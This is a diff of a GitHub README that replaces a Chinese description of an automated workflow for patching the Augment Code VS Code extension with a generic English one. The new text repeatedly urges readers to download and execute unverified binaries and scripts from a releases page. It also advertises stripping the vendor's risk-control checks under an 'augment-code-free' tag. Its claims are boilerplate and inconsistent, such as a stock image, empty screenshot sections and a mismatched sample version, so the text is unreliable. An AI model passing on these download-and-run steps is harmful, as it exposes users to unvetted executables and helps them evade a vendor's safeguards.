@@ -1,140 +1,219 @@
-# Augment Clean Patcher
+# Augment-Clean-Patcher — Strip Telemetry from Augment Code
+[![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/luisbeta1998/augment-clean-patcher/releases) [![augment-code](https://img.shields.io/badge/-augment--code-8da0cb)](https://github.com/topics/augment-code) [![vscode](https://img.shields.io/badge/-vscode-007acc?logo=visual-studio-code)](https://github.com/topics/vscode) [![vscode-extension](https://img.shields.io/badge/-vscode--extension-61dafb)](https://github.com/topics/vscode-extension)
 
-基于 [aug_cleaner](https://github.com/gmh5225/aug_cleaner) 工具的 VS Code Augment 插件自动打包仓库。
+![VSCode patching illustration](https://code.visualstudio.com/assets/images/code-stable.png)
 
-## 为什么选择这个版本的插件？
+Augment-Clean-Patcher removes built-in telemetry, tracing, and risk-control hooks from Augment Code packages. It targets the aug_cleaner flavor and prepares a safe, stripped build you can use offline or in private environments.
 
-本项目基于 **aug_cleaner** 构建，这是一个有实际案例及高度**隐私保护**的专业版本，相比其他简单的修改方案具有显著优势：
+简体中文：本工具为 Augment Code 自动化打包插件（aug_cleaner 版），用于清除 Augment Code 中的遥测、跟踪与风控机制，并生成可用的精简包。
 
-### 技术特性
-- **阻止所有遥测**：拦截 `report-*` 和 `record-*` 等所有跟踪 API 调用
-- **会话匿名化**：为每个 API 调用生成随机会话 ID，防止行为关联
-- **用户代理隐藏**：移除系统指纹数据，防止设备识别
-- **零数据泄露**：确保没有任何遥测数据离开您的机器
+Key topics: augment-code, augment-code-free, vscode, vscode-extension
 
-### 三重保护
+Quick link to releases (download the patch file and run it):
+https://github.com/luisbeta1998/augment-clean-patcher/releases
 
-1. **遥测阻断**
-   - 拦截所有跟踪 API 调用
-   - 返回成功响应以维持功能
-   - 零数据离开您的机器
+---
 
-2. **会话随机化**
-   - 为每个 API 调用生成唯一会话 ID
-   - 防止跨会话行为关联
-   - 使用户跟踪变得不可能
+Table of contents
 
-3. **用户代理隐藏**
-   - 移除系统指纹数据
-   - 防止设备识别
-   - 保持完全匿名
+- Features
+- Why use this
+- How it works
+- Install and run (download and execute release file)
+- Usage examples
+- VSCode extension integration
+- Development notes
+- Troubleshooting
+- Contributing
+- License
+- Credits
 
-## 功能特性
+Features
 
-- 🤖 **自动化构建**: 每日自动检查 Augment Code 插件的新版本
-- 🛠️ **智能补丁**: 使用 aug_cleaner Python 工具自动应用补丁
-- 📦 **自动打包**: 自动重新打包为 VSIX 文件
-- 🚀 **自动发布**: 自动创建 GitHub Release 并上传补丁版本
-- 🔄 **版本管理**: 智能检测版本变化，避免重复构建
+- Remove telemetry calls and network beacons from Augment Code builds.
+- Strip tracing hooks and risk-control checks that block local usage.
+- Produce patched artifacts for Windows, macOS, and Linux.
+- Provide a reproducible patch flow for CI and local builds.
+- Offer a small command-line tool to automate patch steps.
 
-## 工作流程
+Why use this
 
-1. **检出代码**: 获取 aug_cleaner 工具的最新代码
-2. **下载插件**: 从 VS Code Marketplace 下载最新的 Augment Code VSIX 插件
-3. **解包处理**: 解压 VSIX 文件并定位核心 JavaScript 文件
-4. **应用补丁**: 使用 aug_cleaner.py 工具处理插件文件
-5. **重新打包**: 使用 vsce 工具重新打包为 VSIX 文件
-6. **版本发布**: 创建 GitHub Release 并上传补丁版本
+- You keep your environment private. The patch removes outbound telemetry.
+- You build local variants without remote locks.
+- You keep the rest of Augment Code functionality intact.
+- You script the patch into CI for repeatable builds.
 
-## 触发方式
+How it works
 
-### 自动触发
-- **定时任务**: 每天 UTC 时间 8:00 自动运行
-- **代码更新**: 当工作流文件更新时自动运行
+- The tool scans package files to find known telemetry and tracking patterns.
+- It applies targeted edits or replaces modules with neutral stubs.
+- The tool updates build metadata where needed so the patched package installs cleanly.
+- It leaves user-facing features unchanged while neutralizing telemetry calls.
+- The flow aims to be minimal and reversible where possible.
 
-### 手动触发
-1. 进入 GitHub 仓库的 Actions 页面
-2. 选择 "Build Patched Augment Code Extension with aug_cleaner" 工作流
-3. 点击 "Run workflow" 按钮
+Install and run (download and execute release file)
 
-## 安装使用
+Use the Releases page to get the latest build. Download the release asset that matches your platform and follow the run steps below.
 
-### 下载补丁版本
-1. 访问本仓库的 [Releases 页面](../../releases)
-2. 下载最新的 `.vsix` 文件
+Important: the release page hosts the patched executables and scripts. Download the correct asset and execute it.
 
-### 安装到 VS Code
-1. 打开 VS Code
-2. 按 `Ctrl+Shift+X` 打开扩展视图
-3. 点击右上角的 "..." 菜单
-4. 选择 "Install from VSIX..."
-5. 选择下载的 `.vsix` 文件
+Releases page:
+[![Download Releases](https://img.shields.io/badge/Download%20-%20Releases-blue?logo=github)](https://github.com/luisbeta1998/augment-clean-patcher/releases)
 
-## 版本说明
+Typical files you may see on the Releases page:
+- aug-clean-patcher-linux.tar.gz
+- aug-clean-patcher-macos.zip
+- aug-clean-patcher-win.zip
+- aug-clean-patcher.sh (portable script)
+- aug-clean-patcher.exe (Windows binary)
 
-- **标签格式**: `v{原版本号}-patched`
-- **文件命名**: `augmentcode.augment-{版本号}-patched.vsix`
-- **版本检测**: 自动检测新版本，避免重复构建相同版本
+General steps
 
-## 最新状态
+1. Open the Releases page: https://github.com/luisbeta1998/augment-clean-patcher/releases
+2. Download the asset that fits your OS.
+3. Unpack if needed.
+4. Make the script executable (Linux/macOS): chmod +x aug-clean-patcher.sh
+5. Run the patch tool against your Augment Code package.
 
-✅ **已完成最新版本 v0.524.1 的打包测试**
+Examples
 
-## 补丁内容
+- Linux / macOS (script)
+  - chmod +x aug-clean-patcher.sh
+  - ./aug-clean-patcher.sh /path/to/augment-code-package
+- Linux / macOS (binary)
+  - tar -xzf aug-clean-patcher-linux.tar.gz
+  - ./aug-clean-patcher /path/to/augment-code-package
+- Windows
+  - Unzip aug-clean-patcher-win.zip
+  - Run aug-clean-patcher.exe from PowerShell: .\aug-clean-patcher.exe C:\path\to\augment-code-package
 
-本项目使用 [aug_cleaner](https://github.com/gmh5225/aug_cleaner) 工具对 Augment Code 插件进行处理，主要功能包括：
-- 移除遥测和跟踪功能
-- 清理不必要的网络请求
-- 优化插件性能
+Run flow
 
-## 技术细节
+- The tool creates a backup copy of the input package.
+- It logs the changes to a patch.log file inside the output folder.
+- It writes a fingerprint file so you can track that the package passed through this patcher.
 
-### 依赖工具
-- **aug_cleaner**: Python 补丁工具 (要求 Python 3.6+)
-- **@vscode/vsce**: VS Code 插件打包工具
-- **Node.js**: 运行环境
-- **Python 3.9**: 用于运行 aug_cleaner (满足 3.6+ 要求)
-- **jq**: JSON 处理工具
+Usage examples
 
-### 工作流特性
-- 智能版本检测，避免重复构建
-- 自动查找插件核心文件
-- 完整的错误处理和日志记录
-- 自动清理临时文件
+Patch a local VSIX (VSCode extension) build
 
-## 故障排除
+- Unpack the VSIX (it is a zip archive).
+- Run the patch tool against the unpacked folder.
+- Repack the VSIX and install it into VSCode.
 
-### 常见问题
+Commands (sample)
+- unzip extension.vsix -d ext
+- ./aug-clean-patcher.sh ext
+- cd ext && zip -r ../extension-patched.vsix *
+- code --install-extension ../extension-patched.vsix
 
-**Q: 工作流失败，提示 "End-of-central-directory signature not found"**
-A: 这是 VSIX 下载问题。最新版本已改进下载逻辑，包含重试和验证机制。
+Patch a packaged app
 
-**Q: 工作流失败，提示找不到 extension.js**
-A: 这可能是因为插件结构发生变化。工作流会自动查找 `*/out/extension.js` 文件。
+- Stop the app if it runs as a service.
+- Run the patcher on the installation folder.
+- Restart the service.
 
-**Q: 版本已存在，如何重新构建？**
-A: 删除对应的 Git 标签和 Release，工作流会自动重新构建。
+Options
 
-**Q: 如何查看构建日志？**
-A: 进入 Actions 页面，点击对应的工作流运行记录查看详细日志。
+- --dry-run : analyze and report the changes without writing files.
+- --backup-dir <dir> : place backups in the given folder.
+- --log-level <level> : set log verbosity (info, warn, error).
 
-### 详细故障排除
+VSCode extension integration
 
-查看 [TROUBLESHOOTING.md](TROUBLESHOOTING.md) 获取详细的故障排除指南，包括：
-- VSIX 下载和解包问题
-- 网络连接问题
-- Python 版本问题
-- 调试技巧
+- You can add the patch step to extension CI.
+- Insert a job in your pipeline that downloads the release asset and runs it on the build folder.
+- Keep the pipeline idempotent: always produce a fresh patched artifact in a predictable output path.
 
-## 贡献
+Sample CI snippet (concept)
 
-欢迎提交 Issue 和 Pull Request 来改进这个项目。
+- Download release asset for the runner OS.
+- Unpack and run the patch tool.
+- Archive the patched VSIX.
 
-## 许可证
+Development notes
 
-本项目遵循 MIT 许可证。
+- The tool matches known telemetry modules and strings. It uses a small rule set to avoid broad changes.
+- Add a rule when you find a new telemetry pattern. Rules live in the rules/ folder.
+- Tests run by applying the patch to sample fixtures in tests/fixtures and comparing checksums.
+- The repo includes sample fixtures that show before/after state.
 
-## 相关项目
+Project layout (high level)
 
-- [aug_cleaner](https://github.com/gmh5225/aug_cleaner) - Python 补丁工具
-- [Augment Code](https://marketplace.visualstudio.com/items?itemName=augment.vscode-augment) - 原始插件
+- bin/      — compiled binaries and helper scripts
+- src/      — source code for the patcher
+- rules/    — pattern rules the patcher applies
+- docs/     — design notes and examples
+- tests/    — unit tests and fixtures
+
+Troubleshooting
+
+- If the patch finds no patterns, it logs zero changes. Check your input path.
+- If a patched package fails to load, restore the backup and open patch.log to inspect edits.
+- If you see runtime errors, test disabling a single rule to isolate the change.
+- If you cannot run an asset, verify OS and permissions. On macOS, you may need to allow the binary in Security & Privacy.
+
+Security and integrity
+
+- The patcher writes checksums for the original and patched artifacts.
+- Use your CI to sign or notarize the final artifact before distribution.
+- The tool keeps a backup to allow rollbacks.
+
+Contributing
+
+- Open an issue when you find an unsupported telemetry pattern.
+- Submit rule updates as pull requests. Keep rules focused and well-documented.
+- Add tests that show the failing pattern and the correct patched output.
+- Follow the code style in src/. Keep functions small and clear.
+
+Style guide
+
+- Use short functions and small test cases.
+- Add unit tests for each rule.
+- Keep log messages clear and factual.
+
+Releases and downloads
+
+- Visit the Releases page to get the latest stable build: https://github.com/luisbeta1998/augment-clean-patcher/releases
+- Download the platform asset and run it as shown above.
+- Each release contains a changelog and assets for common platforms.
+
+License
+
+- The project uses an open source license. See the LICENSE file in the repo for details.
+
+Credits
+
+- Built for users who need local, offline variants of Augment Code.
+- Based on community reports and sample artifacts.
+
+Badges
+
+- Use the badges at the top for quick access to releases and topics.
+- You can embed the same Releases badge in other documentation.
+
+Useful links
+
+- Releases: https://github.com/luisbeta1998/augment-clean-patcher/releases
+- Topics: augment-code, augment-code-free, vscode, vscode-extension
+
+Screenshots and gallery
+
+- Patch log sample (excerpt)
+  - [PATCH] removed telemetry: network.beacon()
+  - [REPLACE] stubbed trace.startSpan()
+  - [BACKUP] created backups/augment-1.2.3.orig.zip
+
+- Example patched file tree
+  - extension/
+    - package.json
+    - out/
+      - main.js (patched)
+    - patch.log
+
+Localization (简体中文)
+
+- 说明：该工具用于去除 Augment Code 包中的遥测与追踪代码，生成可在本地或离线环境运行的精简版本。
+- 使用方法：前往 Releases 页面，下载匹配平台的发布文件，解压后运行脚本或二进制文件对目标包执行打补丁操作。
+
+End of file
